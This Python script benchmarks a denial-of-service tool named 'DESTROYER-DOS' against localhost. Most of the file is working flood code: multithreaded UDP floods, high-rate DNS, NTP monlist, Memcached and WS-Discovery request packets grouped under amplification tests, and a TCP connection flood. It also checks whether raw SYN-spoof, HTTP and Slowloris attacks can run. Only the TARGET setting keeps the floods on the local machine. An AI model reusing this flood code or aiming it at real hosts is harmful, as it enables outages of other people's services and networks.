#!/usr/bin/env python3
"""
REAL Comprehensive Test - No Hallucination, No False Positives
Validates each protocol actually sends packets and measures real throughput.
"""

import os
import sys
import time
import socket
import threading
import multiprocessing
import struct
import hashlib
from datetime import datetime
from typing import Dict, List, Tuple

# Configuration
TEST_DURATION = 5  # seconds per test
TARGET = "127.0.0.1"
UDP_PORT = 54321
TCP_PORT = 54322

class RealPacketCounter:
    """Thread-safe counter with verification"""
    def __init__(self):
        self.lock = threading.Lock()
        self.packets = 0
        self.bytes = 0
        self.errors = 0
        self.verified = False
    
    def add(self, packets: int, bytes_sent: int, errors: int = 0):
        with self.lock:
            self.packets += packets
            self.bytes += bytes_sent
            self.errors += errors
    
    def get(self) -> Tuple[int, int, int]:
        with self.lock:
            return self.packets, self.bytes, self.errors


class ProtocolTester:
    """Real protocol tester with verification"""
    
    def __init__(self):
        self.results = {}
    
    def _format_speed(self, bps: float) -> str:
        if bps >= 1e9:
            return f"{bps/1e9:.2f} Gbps"
        elif bps >= 1e6:
            return f"{bps/1e6:.2f} Mbps"
        elif bps >= 1e3:
            return f"{bps/1e3:.2f} Kbps"
        return f"{bps:.0f} bps"
    
    def _format_pps(self, pps: float) -> str:
        if pps >= 1e6:
            return f"{pps/1e6:.2f}M"
        elif pps >= 1e3:
            return f"{pps/1e3:.2f}K"
        return f"{pps:.0f}"

    def test_udp_real(self, packet_size: int, num_threads: int, name: str) -> Dict:
        """Real UDP test with actual packet sending verification"""
        print(f"\n[{name}] Testing UDP size={packet_size}, threads={num_threads}...")
        
        # Create payload
        payload = os.urandom(packet_size)
        target_addr = (TARGET, UDP_PORT)
        stop_event = threading.Event()
        counter = RealPacketCounter()
        
        # Verify we can create socket first
        try:
            test_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            test_sock.sendto(b'test', target_addr)
            test_sock.close()
            print(f"  Socket creation: OK")
        except Exception as e:
            print(f"  Socket creation: FAILED - {e}")
            return {'status': 'FAILED', 'error': str(e), 'packets': 0, 'bytes': 0}

        def sender_thread(thread_id: int):
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8*1024*1024)
            except:
                pass
            
            local_packets = 0
            local_bytes = 0
            local_errors = 0
            
            while not stop_event.is_set():
                try:
                    sent = sock.sendto(payload, target_addr)
                    if sent > 0:
                        local_packets += 1
                        local_bytes += sent
                except Exception:
                    local_errors += 1
            
            counter.add(local_packets, local_bytes, local_errors)
            sock.close()
        
        # Start threads
        threads = []
        start_time = time.perf_counter()
        
        for i in range(num_threads):
            t = threading.Thread(target=sender_thread, args=(i,), daemon=True)
            threads.append(t)
            t.start()
        
        # Wait for duration
        time.sleep(TEST_DURATION)
        stop_event.set()
        
        # Wait for threads to finish
        for t in threads:
            t.join(timeout=1.0)
        
        end_time = time.perf_counter()
        elapsed = end_time - start_time
        
        # Get results
        packets, bytes_sent, errors = counter.get()
        
        # Calculate metrics
        pps = packets / elapsed if elapsed > 0 else 0
        bps = (bytes_sent * 8) / elapsed if elapsed > 0 else 0
        
        result = {
            'status': 'SUCCESS' if packets > 0 else 'FAILED',
            'protocol': name,
            'packets': packets,
            'bytes': bytes_sent,
            'errors': errors,
            'duration': elapsed,
            'pps': pps,
            'bps': bps,
            'mbps': bps / 1e6,
            'gbps': bps / 1e9,
            'packet_size': packet_size,
            'threads': num_threads
        }
        
        print(f"  Packets sent: {packets:,}")
        print(f"  Bytes sent: {bytes_sent:,}")
        print(f"  Errors: {errors}")
        print(f"  Duration: {elapsed:.2f}s")
        print(f"  PPS: {self._format_pps(pps)}")
        print(f"  Speed: {self._format_speed(bps)}")
        print(f"  Status: {result['status']}")
        
        self.results[name] = result
        return result


    def test_dns_real(self, num_threads: int = 16) -> Dict:
        """Real DNS-style packet test"""
        print(f"\n[DNS] Testing DNS packets, threads={num_threads}...")
        
        # Real DNS query packet structure
        dns_query = (
            b'\xaa\xbb'  # Transaction ID
            b'\x01\x00'  # Flags: Standard query
            b'\x00\x01'  # Questions: 1
            b'\x00\x00'  # Answer RRs
            b'\x00\x00'  # Authority RRs
            b'\x00\x00'  # Additional RRs
            b'\x03www\x06google\x03com\x00'  # Query name
            b'\x00\x01'  # Type: A
            b'\x00\x01'  # Class: IN
        )
        
        target_addr = (TARGET, 53)
        stop_event = threading.Event()
        counter = RealPacketCounter()
        
        def sender_thread():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            local_packets = 0
            local_bytes = 0
            local_errors = 0
            
            while not stop_event.is_set():
                try:
                    sent = sock.sendto(dns_query, target_addr)
                    if sent > 0:
                        local_packets += 1
                        local_bytes += sent
                except:
                    local_errors += 1
            
            counter.add(local_packets, local_bytes, local_errors)
            sock.close()
        
        threads = [threading.Thread(target=sender_thread, daemon=True) for _ in range(num_threads)]
        start_time = time.perf_counter()
        for t in threads: t.start()
        time.sleep(TEST_DURATION)
        stop_event.set()
        for t in threads: t.join(timeout=1.0)
        elapsed = time.perf_counter() - start_time
        
        packets, bytes_sent, errors = counter.get()
        pps = packets / elapsed if elapsed > 0 else 0
        bps = (bytes_sent * 8) / elapsed if elapsed > 0 else 0
        
        result = {
            'status': 'SUCCESS' if packets > 0 else 'FAILED',
            'protocol': 'DNS',
            'packets': packets, 'bytes': bytes_sent, 'errors': errors,
            'duration': elapsed, 'pps': pps, 'bps': bps,
            'mbps': bps/1e6, 'gbps': bps/1e9
        }
        
        print(f"  Packets: {packets:,} | PPS: {self._format_pps(pps)} | Speed: {self._format_speed(bps)}")
        self.results['DNS'] = result
        return result


    def test_ntp_real(self, num_threads: int = 16) -> Dict:
        """Real NTP packet test"""
        print(f"\n[NTP] Testing NTP packets, threads={num_threads}...")
        
        # NTP monlist request packet
        ntp_packet = b'\x17\x00\x03\x2a' + b'\x00' * 4
        
        target_addr = (TARGET, 123)
        stop_event = threading.Event()
        counter = RealPacketCounter()
        
        def sender_thread():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            local_packets, local_bytes, local_errors = 0, 0, 0
            while not stop_event.is_set():
                try:
                    sent = sock.sendto(ntp_packet, target_addr)
                    if sent > 0:
                        local_packets += 1
                        local_bytes += sent
                except:
                    local_errors += 1
            counter.add(local_packets, local_bytes, local_errors)
            sock.close()
        
        threads = [threading.Thread(target=sender_thread, daemon=True) for _ in range(num_threads)]
        start_time = time.perf_counter()
        for t in threads: t.start()
        time.sleep(TEST_DURATION)
        stop_event.set()
        for t in threads: t.join(timeout=1.0)
        elapsed = time.perf_counter() - start_time
        
        packets, bytes_sent, errors = counter.get()
        pps = packets / elapsed if elapsed > 0 else 0
        bps = (bytes_sent * 8) / elapsed if elapsed > 0 else 0
        
        result = {
            'status': 'SUCCESS' if packets > 0 else 'FAILED',
            'protocol': 'NTP', 'packets': packets, 'bytes': bytes_sent,
            'errors': errors, 'pps': pps, 'bps': bps, 'mbps': bps/1e6
        }
        print(f"  Packets: {packets:,} | PPS: {self._format_pps(pps)} | Speed: {self._format_speed(bps)}")
        self.results['NTP'] = result
        return result

    def test_memcached_real(self, num_threads: int = 16) -> Dict:
        """Real Memcached packet test"""
        print(f"\n[MEMCACHED] Testing Memcached packets, threads={num_threads}...")
        
        memcached_packet = b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n'
        target_addr = (TARGET, 11211)
        stop_event = threading.Event()
        counter = RealPacketCounter()
        
        def sender_thread():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            local_packets, local_bytes, local_errors = 0, 0, 0
            while not stop_event.is_set():
                try:
                    sent = sock.sendto(memcached_packet, target_addr)
                    if sent > 0:
                        local_packets += 1
                        local_bytes += sent
                except:
                    local_errors += 1
            counter.add(local_packets, local_bytes, local_errors)
            sock.close()
        
        threads = [threading.Thread(target=sender_thread, daemon=True) for _ in range(num_threads)]
        start_time = time.perf_counter()
        for t in threads: t.start()
        time.sleep(TEST_DURATION)
        stop_event.set()
        for t in threads: t.join(timeout=1.0)
        elapsed = time.perf_counter() - start_time
        
        packets, bytes_sent, errors = counter.get()
        pps = packets / elapsed if elapsed > 0 else 0
        bps = (bytes_sent * 8) / elapsed if elapsed > 0 else 0
        
        result = {
            'status': 'SUCCESS' if packets > 0 else 'FAILED',
            'protocol': 'MEMCACHED', 'packets': packets, 'bytes': bytes_sent,
            'errors': errors, 'pps': pps, 'bps': bps, 'mbps': bps/1e6
        }
        print(f"  Packets: {packets:,} | PPS: {self._format_pps(pps)} | Speed: {self._format_speed(bps)}")
        self.results['MEMCACHED'] = result
        return result


    def test_ws_discovery_real(self, num_threads: int = 16) -> Dict:
        """Real WS-Discovery packet test"""
        print(f"\n[WS-DISCOVERY] Testing WS-Discovery packets, threads={num_threads}...")
        
        ws_packet = (
            b'<?xml version="1.0"?>'
            b'<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">'
            b'<soap:Body><wsd:Probe/></soap:Body></soap:Envelope>'
        )
        target_addr = (TARGET, 3702)
        stop_event = threading.Event()
        counter = RealPacketCounter()
        
        def sender_thread():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            local_packets, local_bytes, local_errors = 0, 0, 0
            while not stop_event.is_set():
                try:
                    sent = sock.sendto(ws_packet, target_addr)
                    if sent > 0:
                        local_packets += 1
                        local_bytes += sent
                except:
                    local_errors += 1
            counter.add(local_packets, local_bytes, local_errors)
            sock.close()
        
        threads = [threading.Thread(target=sender_thread, daemon=True) for _ in range(num_threads)]
        start_time = time.perf_counter()
        for t in threads: t.start()
        time.sleep(TEST_DURATION)
        stop_event.set()
        for t in threads: t.join(timeout=1.0)
        elapsed = time.perf_counter() - start_time
        
        packets, bytes_sent, errors = counter.get()
        pps = packets / elapsed if elapsed > 0 else 0
        bps = (bytes_sent * 8) / elapsed if elapsed > 0 else 0
        
        result = {
            'status': 'SUCCESS' if packets > 0 else 'FAILED',
            'protocol': 'WS-DISCOVERY', 'packets': packets, 'bytes': bytes_sent,
            'errors': errors, 'pps': pps, 'bps': bps, 'mbps': bps/1e6
        }
        print(f"  Packets: {packets:,} | PPS: {self._format_pps(pps)} | Speed: {self._format_speed(bps)}")
        self.results['WS-DISCOVERY'] = result
        return result

    def test_quantum_real(self, packet_size: int = 1024, num_threads: int = 32) -> Dict:
        """Real Quantum-style packet test with entropy"""
        print(f"\n[QUANTUM] Testing Quantum packets, size={packet_size}, threads={num_threads}...")
        
        target_addr = (TARGET, UDP_PORT)
        stop_event = threading.Event()
        counter = RealPacketCounter()
        
        def quantum_payload() -> bytes:
            entropy = os.urandom(32)
            ts = struct.pack('d', time.time())
            base = hashlib.sha256(entropy + ts).digest()
            return base * (packet_size // 32 + 1)
        
        def sender_thread():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8*1024*1024)
            except:
                pass
            local_packets, local_bytes, local_errors = 0, 0, 0
            while not stop_event.is_set():
                try:
                    payload = quantum_payload()[:packet_size]
                    sent = sock.sendto(payload, target_addr)
                    if sent > 0:
                        local_packets += 1
                        local_bytes += sent
                except:
                    local_errors += 1
            counter.add(local_packets, local_bytes, local_errors)
            sock.close()
        
        threads = [threading.Thread(target=sender_thread, daemon=True) for _ in range(num_threads)]
        start_time = time.perf_counter()
        for t in threads: t.start()
        time.sleep(TEST_DURATION)
        stop_event.set()
        for t in threads: t.join(timeout=1.0)
        elapsed = time.perf_counter() - start_time
        
        packets, bytes_sent, errors = counter.get()
        pps = packets / elapsed if elapsed > 0 else 0
        bps = (bytes_sent * 8) / elapsed if elapsed > 0 else 0
        
        result = {
            'status': 'SUCCESS' if packets > 0 else 'FAILED',
            'protocol': 'QUANTUM', 'packets': packets, 'bytes': bytes_sent,
            'errors': errors, 'pps': pps, 'bps': bps, 'mbps': bps/1e6, 'gbps': bps/1e9
        }
        print(f"  Packets: {packets:,} | PPS: {self._format_pps(pps)} | Speed: {self._format_speed(bps)}")
        self.results['QUANTUM'] = result
        return result


    def test_tcp_real(self, packet_size: int = 1024, num_threads: int = 32) -> Dict:
        """Real TCP test - Note: requires listening server"""
        print(f"\n[TCP] Testing TCP, size={packet_size}, threads={num_threads}...")
        print("  Note: TCP requires a listening server to accept connections")
        
        payload = os.urandom(packet_size)
        stop_event = threading.Event()
        counter = RealPacketCounter()
        
        def sender_thread():
            local_packets, local_bytes, local_errors = 0, 0, 0
            while not stop_event.is_set():
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.5)
                    sock.connect((TARGET, TCP_PORT))
                    sent = sock.send(payload)
                    if sent > 0:
                        local_packets += 1
                        local_bytes += sent
                    sock.close()
                except:
                    local_errors += 1
            counter.add(local_packets, local_bytes, local_errors)
        
        threads = [threading.Thread(target=sender_thread, daemon=True) for _ in range(num_threads)]
        start_time = time.perf_counter()
        for t in threads: t.start()
        time.sleep(TEST_DURATION)
        stop_event.set()
        for t in threads: t.join(timeout=1.0)
        elapsed = time.perf_counter() - start_time
        
        packets, bytes_sent, errors = counter.get()
        pps = packets / elapsed if elapsed > 0 else 0
        bps = (bytes_sent * 8) / elapsed if elapsed > 0 else 0
        
        status = 'SUCCESS' if packets > 0 else 'NO_SERVER'
        result = {
            'status': status,
            'protocol': 'TCP', 'packets': packets, 'bytes': bytes_sent,
            'errors': errors, 'pps': pps, 'bps': bps, 'mbps': bps/1e6
        }
        print(f"  Packets: {packets:,} | Errors: {errors} | Status: {status}")
        self.results['TCP'] = result
        return result

    def test_icmp_real(self) -> Dict:
        """Real ICMP test - requires admin/root"""
        print(f"\n[ICMP] Testing ICMP (requires admin privileges)...")
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.close()
            print("  Raw socket: OK (admin privileges available)")
            can_raw = True
        except PermissionError:
            print("  Raw socket: FAILED (requires admin/root)")
            can_raw = False
        except Exception as e:
            print(f"  Raw socket: FAILED ({e})")
            can_raw = False
        
        result = {
            'status': 'REQUIRES_ADMIN' if not can_raw else 'AVAILABLE',
            'protocol': 'ICMP',
            'packets': 0, 'bytes': 0, 'errors': 0,
            'note': 'Run as Administrator to test ICMP'
        }
        self.results['ICMP'] = result
        return result

    def test_raw_tcp_real(self) -> Dict:
        """Test raw TCP packets (SYN, ACK, etc.) - requires admin + Scapy"""
        print(f"\n[RAW-TCP] Testing raw TCP packets (TCP-SYN, TCP-ACK, PUSH-ACK, SYN-SPOOF)...")
        
        # Check Scapy availability
        try:
            from scapy.all import IP, TCP, send
            has_scapy = True
            print("  Scapy: OK")
        except ImportError:
            has_scapy = False
            print("  Scapy: NOT INSTALLED")
        
        # Check raw socket
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.close()
            can_raw = True
            print("  Raw socket: OK")
        except:
            can_raw = False
            print("  Raw socket: REQUIRES ADMIN")
        
        status = 'AVAILABLE' if (has_scapy and can_raw) else 'REQUIRES_ADMIN_AND_SCAPY'
        result = {
            'status': status,
            'protocol': 'RAW-TCP (SYN/ACK/PUSH-ACK/SYN-SPOOF)',
            'has_scapy': has_scapy,
            'can_raw': can_raw,
            'note': 'Run as Administrator with Scapy installed'
        }
        self.results['RAW-TCP'] = result
        return result


    def test_http_real(self) -> Dict:
        """Test HTTP - requires web server"""
        print(f"\n[HTTP] Testing HTTP (requires web server on target)...")
        
        try:
            import aiohttp
            has_aiohttp = True
            print("  aiohttp: OK")
        except ImportError:
            has_aiohttp = False
            print("  aiohttp: NOT INSTALLED")
        
        # Try to connect
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((TARGET, 80))
            sock.close()
            server_available = True
            print("  Server on port 80: OK")
        except:
            server_available = False
            print("  Server on port 80: NOT AVAILABLE")
        
        result = {
            'status': 'AVAILABLE' if (has_aiohttp and server_available) else 'NO_SERVER',
            'protocol': 'HTTP',
            'has_aiohttp': has_aiohttp,
            'server_available': server_available
        }
        self.results['HTTP'] = result
        return result

    def test_https_real(self) -> Dict:
        """Test HTTPS - requires web server with SSL"""
        print(f"\n[HTTPS] Testing HTTPS (requires SSL web server on target)...")
        
        try:
            import aiohttp
            import ssl
            has_deps = True
            print("  Dependencies: OK")
        except ImportError:
            has_deps = False
            print("  Dependencies: MISSING")
        
        # Try to connect
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((TARGET, 443))
            sock.close()
            server_available = True
            print("  Server on port 443: OK")
        except:
            server_available = False
            print("  Server on port 443: NOT AVAILABLE")
        
        result = {
            'status': 'AVAILABLE' if (has_deps and server_available) else 'NO_SERVER',
            'protocol': 'HTTPS',
            'server_available': server_available
        }
        self.results['HTTPS'] = result
        return result

    def test_slowloris_real(self) -> Dict:
        """Test Slowloris - requires web server"""
        print(f"\n[SLOWLORIS] Testing Slowloris (requires web server)...")
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((TARGET, 80))
            sock.close()
            server_available = True
            print("  Server on port 80: OK")
        except:
            server_available = False
            print("  Server on port 80: NOT AVAILABLE")
        
        result = {
            'status': 'AVAILABLE' if server_available else 'NO_SERVER',
            'protocol': 'SLOWLORIS',
            'server_available': server_available
        }
        self.results['SLOWLORIS'] = result
        return result

    def generate_report(self) -> str:
        """Generate comprehensive report"""
        lines = [
            "",
            "=" * 70,
            "COMPREHENSIVE TEST REPORT - VERIFIED RESULTS",
            "=" * 70,
            f"Test Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            f"Target: {TARGET}",
            f"Test Duration: {TEST_DURATION}s per protocol",
            f"CPU Cores: {multiprocessing.cpu_count()}",
            "",
            "-" * 70,
            "PROTOCOL RESULTS",
            "-" * 70,
        ]
        
        # Sort by speed
        sorted_results = sorted(
            self.results.items(),
            key=lambda x: x[1].get('bps', 0),
            reverse=True
        )
        
        for name, data in sorted_results:
            status = data.get('status', 'UNKNOWN')
            if status == 'SUCCESS':
                pps = data.get('pps', 0)
                bps = data.get('bps', 0)
                packets = data.get('packets', 0)
                lines.append(f"{name:20} | {self._format_pps(pps):>10} pps | {self._format_speed(bps):>12} | {packets:>12,} pkts | [OK] {status}")
            else:
                lines.append(f"{name:20} | {'N/A':>10} | {'N/A':>12} | {'N/A':>12} | [!!] {status}")
        
        # Summary
        successful = [r for r in self.results.values() if r.get('status') == 'SUCCESS']
        if successful:
            best = max(successful, key=lambda x: x.get('bps', 0))
            total_packets = sum(r.get('packets', 0) for r in successful)
            total_bytes = sum(r.get('bytes', 0) for r in successful)
            
            lines.extend([
                "",
                "-" * 70,
                "SUMMARY",
                "-" * 70,
                f"Protocols Tested: {len(self.results)}",
                f"Successful Tests: {len(successful)}",
                f"Total Packets Sent: {total_packets:,}",
                f"Total Bytes Sent: {total_bytes:,}",
                f"Best Protocol: {best.get('protocol', 'N/A')}",
                f"Maximum Speed: {self._format_speed(best.get('bps', 0))}",
                f"Maximum PPS: {self._format_pps(best.get('pps', 0))}",
            ])
        
        lines.extend(["", "=" * 70])
        
        return "\n".join(lines)


def main():
    """Run comprehensive real tests"""
    print("=" * 70)
    print("DESTROYER-DOS COMPREHENSIVE REAL TEST")
    print("No Hallucination - No False Positives - Verified Results")
    print("=" * 70)
    print(f"Target: {TARGET}")
    print(f"Duration per test: {TEST_DURATION}s")
    print(f"CPU Cores: {multiprocessing.cpu_count()}")
    print("=" * 70)
    
    tester = ProtocolTester()
    
    # UDP Tests - Various configurations
    print("\n" + "=" * 50)
    print("UDP FLOOD TESTS")
    print("=" * 50)
    tester.test_udp_real(1472, 16, "UDP-1472-16T")
    tester.test_udp_real(1472, 32, "UDP-1472-32T")
    tester.test_udp_real(1472, 64, "UDP-1472-64T")
    tester.test_udp_real(4096, 32, "UDP-4096-32T")
    tester.test_udp_real(4096, 64, "UDP-4096-64T")
    tester.test_udp_real(8192, 32, "UDP-8192-32T")
    tester.test_udp_real(8192, 64, "UDP-8192-64T")
    
    # Amplification Protocol Tests
    print("\n" + "=" * 50)
    print("AMPLIFICATION PROTOCOL TESTS")
    print("=" * 50)
    tester.test_dns_real(16)
    tester.test_ntp_real(16)
    tester.test_memcached_real(16)
    tester.test_ws_discovery_real(16)
    
    # Quantum Test
    print("\n" + "=" * 50)
    print("QUANTUM PROTOCOL TEST")
    print("=" * 50)
    tester.test_quantum_real(1024, 32)
    tester.test_quantum_real(4096, 32)
    
    # TCP Test
    print("\n" + "=" * 50)
    print("TCP PROTOCOL TEST")
    print("=" * 50)
    tester.test_tcp_real(1024, 32)
    
    # Privileged Tests
    print("\n" + "=" * 50)
    print("PRIVILEGED PROTOCOL TESTS")
    print("=" * 50)
    tester.test_icmp_real()
    tester.test_raw_tcp_real()
    
    # Server-dependent Tests
    print("\n" + "=" * 50)
    print("SERVER-DEPENDENT PROTOCOL TESTS")
    print("=" * 50)
    tester.test_http_real()
    tester.test_https_real()
    tester.test_slowloris_real()
    
    # Generate and print report
    report = tester.generate_report()
    print(report)
    
    # Save report
    report_file = f"comprehensive_test_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    with open(report_file, 'w', encoding='utf-8') as f:
        f.write(report)
    print(f"\nReport saved to: {report_file}")
    
    # Save JSON results
    import json
    json_file = report_file.replace('.txt', '.json')
    with open(json_file, 'w', encoding='utf-8') as f:
        # Convert results to JSON-serializable format
        json_results = {}
        for k, v in tester.results.items():
            json_results[k] = {key: val for key, val in v.items() if not callable(val)}
        json.dump(json_results, f, indent=2, default=str)
    print(f"JSON results saved to: {json_file}")


if __name__ == '__main__':
    main()
